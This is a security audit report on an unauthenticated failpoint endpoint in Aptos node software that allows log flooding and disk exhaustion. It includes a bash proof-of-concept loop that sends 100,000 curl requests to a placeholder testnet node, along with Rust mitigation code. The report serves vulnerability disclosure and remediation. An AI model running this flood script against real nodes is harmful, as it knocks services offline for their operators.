# Audit Report

## Title
Unauthenticated Failpoint Configuration Endpoint Enables Log Flooding Attack Leading to Node Disk Exhaustion

## Summary
The `/v1/set_failpoint` endpoint lacks authentication and rate limiting controls, allowing unauthenticated attackers to repeatedly configure failpoints and generate unbounded INFO-level logs. Combined with the absence of log rotation in `FileWriter`, this enables disk space exhaustion attacks that can crash nodes in testing/debugging environments where failpoints are enabled.

## Finding Description

The vulnerability exists in the failpoint configuration endpoint exposed through the Node API. When failpoints are enabled via configuration, the endpoint becomes accessible without any authentication or rate limiting. [1](#0-0) 

Each successful failpoint configuration request generates an INFO-level log entry through the logging system: [2](#0-1) 

The endpoint is registered in the API routing without any authentication middleware: [3](#0-2) 

The routing setup shows no authentication or rate limiting middleware is applied to the failpoint endpoint. Only generic middleware like CORS, compression, and error handling are present: [4](#0-3) 

The Aptos logger's `FileWriter` implementation writes logs to a file in append mode with no rotation mechanism: [5](#0-4) 

**Attack Flow:**
1. Attacker discovers a testnet/devnet node with `failpoints_enabled: true` (required for debugging)
2. Attacker sends repeated GET requests: `/v1/set_failpoint?name=attack&actions=off`
3. Each request generates: `"Configured failpoint attack to off"` log entry
4. No rate limiting prevents request flooding (thousands/millions of requests)
5. Logs accumulate unbounded (no rotation in FileWriter)
6. Disk space fills to capacity
7. Node crashes when unable to write logs or database operations fail

## Impact Explanation

This vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

**Severity: MEDIUM** per Aptos bug bounty criteria:
- Node availability disruption in non-mainnet environments
- Requires manual intervention to recover (disk cleanup, log rotation configuration)
- Can cause validator node slowdowns and API crashes (approaching HIGH severity)

While failpoints are disabled by default and blocked on mainnet, the attack surface includes: [6](#0-5) [7](#0-6) 

However, testnet/devnet validators and development nodes legitimately enable failpoints for debugging, creating a valid attack surface where this vulnerability can be exploited.

## Likelihood Explanation

**Likelihood: MEDIUM**

**Preconditions:**
- Target node must have `failpoints_enabled: true` in configuration
- API endpoint must be network-accessible to attacker
- Sufficient time to fill disk (depends on disk size and request rate)

**Attacker Requirements:**
- Network access to target node's API (typically port 8080)
- Simple HTTP client (curl, wget, custom script)
- No authentication credentials required

**Realistic Scenarios:**
- Public testnet validators running with failpoints enabled for debugging
- Devnet nodes left with failpoints enabled after testing
- Development/staging environments with exposed APIs

The attack is trivial to execute once prerequisites are met (simple HTTP flood), but the scope is limited to non-production environments where failpoints are intentionally enabled.

## Recommendation

Implement multiple layers of defense:

**1. Add Authentication to Failpoint Endpoint:**
```rust
// In api/src/runtime.rs, add authentication middleware
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .with(auth_middleware) // Add authentication check
        .data(context.clone()),
)
```

**2. Add Rate Limiting:**
```rust
// Apply rate limiting to prevent flooding
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .with(RateLimitMiddleware::new(10, Duration::from_secs(60))) // 10 req/min
        .data(context.clone()),
)
```

**3. Implement Log Rotation in FileWriter:**
```rust
// In crates/aptos-logger/src/aptos_logger.rs
// Use a rotation-capable writer (e.g., tracing-appender or custom rotation)
pub struct FileWriter {
    log_file: RwLock<RotatingFileWriter>, // With max size/count limits
}
```

**4. Add Security Warning in Configuration:**
```rust
// In config validation, warn when failpoints are enabled
if api_config.failpoints_enabled {
    warn!("SECURITY WARNING: Failpoints are enabled. This endpoint has no authentication and should not be exposed to untrusted networks.");
}
```

**5. Consider Moving to Admin Port:**
Move the failpoint endpoint to the admin API (port 9102) which should have restricted network access.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Log flooding attack via failpoint endpoint

TARGET="http://testnet-validator.example.com:8080"
ITERATIONS=100000

echo "Starting log flooding attack..."
for i in $(seq 1 $ITERATIONS); do
    curl -s "$TARGET/v1/set_failpoint?name=flood_$i&actions=off" > /dev/null
    if [ $((i % 1000)) -eq 0 ]; then
        echo "Sent $i requests..."
    fi
done

echo "Attack complete. Monitor target node's disk usage and logs."
```

**Expected Result:**
- Target node's log file grows rapidly (each request adds ~50-100 bytes)
- With 100K requests: ~5-10 MB of log data
- With millions of requests (easily achievable): Gigabytes of log data
- Eventually: Disk full → node crash → service unavailable

**Notes:**
- Attack works ONLY if `failpoints_enabled: true` in target node's configuration
- Mainnet nodes are protected by config sanitizer, but testnet/devnet are vulnerable
- No authentication means any network-accessible attacker can exploit this
- No rate limiting allows rapid disk consumption
- Lack of log rotation means logs grow unbounded until disk is full

### Citations

**File:** api/src/set_failpoints.rs (L23-40)
```rust
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** api/src/runtime.rs (L229-259)
```rust
    runtime_handle.spawn(async move {
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);

        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** crates/aptos-logger/src/aptos_logger.rs (L718-746)
```rust
pub struct FileWriter {
    log_file: RwLock<std::fs::File>,
}

impl FileWriter {
    pub fn new(log_file: std::path::PathBuf) -> Self {
        let file = std::fs::OpenOptions::new()
            .append(true)
            .create(true)
            .open(log_file)
            .expect("Unable to open log file");
        Self {
            log_file: RwLock::new(file),
        }
    }
}

impl Writer for FileWriter {
    /// Write to file
    fn write(&self, log: String) {
        if let Err(err) = writeln!(self.log_file.write(), "{}", log) {
            eprintln!("Unable to write to log file: {}", err);
        }
    }

    fn write_buferred(&mut self, log: String) {
        self.write(log);
    }
}
```

**File:** config/src/config/api_config.rs (L122-122)
```rust
            failpoints_enabled: default_disabled(),
```

**File:** config/src/config/api_config.rs (L177-184)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
```
